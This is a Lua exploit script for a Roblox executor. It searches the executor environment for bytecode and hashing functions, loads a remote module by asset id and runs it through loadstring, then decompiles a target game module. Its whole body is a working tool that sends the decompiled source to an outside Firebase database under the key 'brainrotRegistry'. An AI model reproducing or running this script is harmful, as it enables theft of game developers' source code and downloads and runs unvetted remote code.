local global_container
do
    local finder_code, global_container_obj = (function()
        local globalenv = getgenv and getgenv() or _G or shared
        local globalcontainer = globalenv.globalcontainer
        if not globalcontainer then
            globalcontainer = {}
            globalenv.globalcontainer = globalcontainer
        end
        local genvs = { _G, shared }
        if getgenv then
            table.insert(genvs, getgenv())
        end
        local calllimit = 0
        do
            local function determineCalllimit()
                calllimit = calllimit + 1
                determineCalllimit()
            end
            pcall(determineCalllimit)
        end
        local function isEmpty(dict)
            for _ in next, dict do
                return
            end
            return true
        end
        local depth, printresults, hardlimit, query, antioverflow, matchedall
        local function recurseEnv(env, envname)
            if globalcontainer == env then
                return
            end
            if antioverflow[env] then
                return
            end
            antioverflow[env] = true
            depth = depth + 1
            for name, val in next, env do
                if matchedall then
                    break
                end
                local Type = type(val)
                if Type == "table" then
                    if depth < hardlimit then
                        recurseEnv(val, name)
                    end
                elseif Type == "function" then
                    name = string.lower(tostring(name))
                    local matched
                    for methodname, pattern in next, query do
                        if pattern(name, envname) then
                            globalcontainer[methodname] = val
                            if not matched then
                                matched = {}
                            end
                            table.insert(matched, methodname)
                            if printresults then
                                print(methodname, name)
                            end
                        end
                    end
                    if matched then
                        for _, methodname in next, matched do
                            query[methodname] = nil
                        end
                        matchedall = isEmpty(query)
                        if matchedall then
                            break
                        end
                    end
                end
            end
            depth = depth - 1
        end
        local function finder(Query, ForceSearch, CustomCallLimit, PrintResults)
            antioverflow = {}
            query = {}
            do
                local function Find(String, Pattern)
                    return string.find(String, Pattern, nil, true)
                end
                for methodname, pattern in next, Query do
                    if not globalcontainer[methodname] or ForceSearch then
                        if not Find(pattern, "return") then
                            pattern = "return " .. pattern
                        end
                        query[methodname] = loadstring(pattern)
                    end
                end
            end
            depth = 0
            printresults = PrintResults
            hardlimit = CustomCallLimit or calllimit
            recurseEnv(genvs)
            do
                local env = getfenv()
                for methodname in next, Query do
                    if not globalcontainer[methodname] then
                        globalcontainer[methodname] = env[methodname]
                    end
                end
            end
            hardlimit = nil
            depth = nil
            printresults = nil
            antioverflow = nil
            query = nil
        end
        return finder, globalcontainer
    end)()
    global_container = global_container_obj
    finder_code({
        getscriptbytecode = 'string.find(...,"get",nil,true) and string.find(...,"bytecode",nil,true)',
        hash = 'local a={...}local b=a[1]local function c(a,b)return string.find(a,b,nil,true)end;return c(b,"hash")and c(string.lower(tostring(a[2])),"crypt")'
    }, true, 10)
end
local getscriptbytecode = global_container.getscriptbytecode
local sha384
if global_container.hash then
    sha384 = function(data)
        return global_container.hash(data, "sha384")
    end
end
if not sha384 then
    pcall(function()
        local require_online = (function()
            local RequireCache = {}
            local function ARequire(ModuleScript)
                local Cached = RequireCache[ModuleScript]
                if Cached then
                    return Cached
                end
                local Source = ModuleScript.Source
                local LoadedSource = loadstring(Source)
                local fenv = getfenv(LoadedSource)
                fenv.script = ModuleScript
                fenv.require = ARequire
                local Output = LoadedSource()
                RequireCache[ModuleScript] = Output
                return Output
            end
            local function ARequireController(AssetId)
                local ModuleScript = game:GetObjects("rbxassetid://" .. AssetId)[1]
                return ARequire(ModuleScript)
            end
            return ARequireController
        end)()
        if require_online then
            sha384 = require_online(4544052033).sha384
        end
    end)
end
local decompile = decompile
local genv = getgenv()
if not genv.scriptcache then
    genv.scriptcache = {}
end
local ldeccache = genv.scriptcache
local function construct_TimeoutHandler(timeout, func, timeout_return_value)
    return function(...)
        local args = { ... }
        if not func then
            return false, "Function is nil"
        end
        if timeout < 0 then
            return pcall(func, table.unpack(args))
        end
        local thread = coroutine.running()
        local timeoutThread, isCancelled
        timeoutThread = task.delay(timeout, function()
            isCancelled = true
            coroutine.resume(thread, nil, timeout_return_value)
        end)
        task.spawn(function()
            local success, result = pcall(func, table.unpack(args))
            if isCancelled then
                return
            end
            task.cancel(timeoutThread)
            while coroutine.status(thread) ~= "suspended" do
                task.wait()
            end
            coroutine.resume(thread, success, result)
        end)
        return coroutine.yield()
    end
end
function getScriptSource(scriptInstance, timeout)
    if not (decompile and getscriptbytecode and sha384) then
        return false, "Error: Required functions are missing."
    end
    local decompileTimeout = timeout or 10
    local getbytecode_h = construct_TimeoutHandler(3, getscriptbytecode)
    local decompiler_h = construct_TimeoutHandler(decompileTimeout, decompile, "-- Decompiler timed out after " .. tostring(decompileTimeout) .. " seconds.")
    local success, bytecode = getbytecode_h(scriptInstance)
    local hashed_bytecode
    local cached_source
    if success and bytecode and bytecode ~= "" then
        hashed_bytecode = sha384(bytecode)
        cached_source = ldeccache[hashed_bytecode]
    elseif success then
        return true, "-- The script is empty."
    else
        return false, "-- Failed to get bytecode."
    end
    if cached_source then
        return true, cached_source
    end
    local decompile_success, decompiled_source = decompiler_h(scriptInstance)
    local output
    if decompile_success and decompiled_source then
        output = string.gsub(decompiled_source, "\0", "\\0")
    else
        output = "--[[ Failed to decompile. Reason: " .. tostring(decompiled_source) .. " ]]"
    end
    
    local match_start, match_end = output:find("^(%-%- .-\n)(%-%- .-\n)(%-%- .-\n)(%-%- .-\n)(%-%- .-\n)%s*\n")
    if match_start == 1 then
        output = output:sub(match_end + 1)
    end
    
    if hashed_bytecode then
        ldeccache[hashed_bytecode] = output
    end
    return true, output
end
if not (decompile and getscriptbytecode and sha384) then
    print("Decompiler functions missing.")
    return
end
local http_request = request or syn.request
if not http_request then
    print("HTTP request function not found.")
    return
end
local http_service
pcall(function()
    http_service = game:GetService("HttpService")
end)
local function splitStringByLines(str)
    local lines = {}
    for line in string.gmatch(str, "([^\n]*)") do
        table.insert(lines, line)
    end
    return lines
end
local function sendToFirebase(data, keyName)
    if not http_service then
        print("HttpService is required to send data.")
        return
    end
    local url = "https://moduledata-78071-default-rtdb.firebaseio.com/" .. keyName .. ".json"
    local jsonData
    local success, result = pcall(function()
        jsonData = http_service:JSONEncode(data)
    end)
    if not success then
        print("Failed to encode JSON: " .. tostring(result))
        return
    end
    pcall(function()
        http_request({
            Url = url,
            Method = "PUT",
            Body = jsonData,
            Headers = {
                ["Content-Type"] = "application/json"
            }
        })
    end)
end
local targetModule = genv.targetModule
if targetModule and typeof(targetModule) == "Instance" then
    local success, source_code = getScriptSource(targetModule)
    if success then
        local lines_array = splitStringByLines(source_code)
        sendToFirebase(lines_array, "brainrotRegistry")
        print("Decompiled and sent source for " .. targetModule:GetFullName())
    else
        local fail_reason = "Failed to decompile " .. targetModule:GetFullName() .. ": " .. tostring(source_code)
        print(fail_reason)
        sendToFirebase(fail_reason, "error")
    end
else
    print("not a valid instance.")
    sendToFirebase("ERROR: genv.targetModule is not a valid instance.", "error")
end
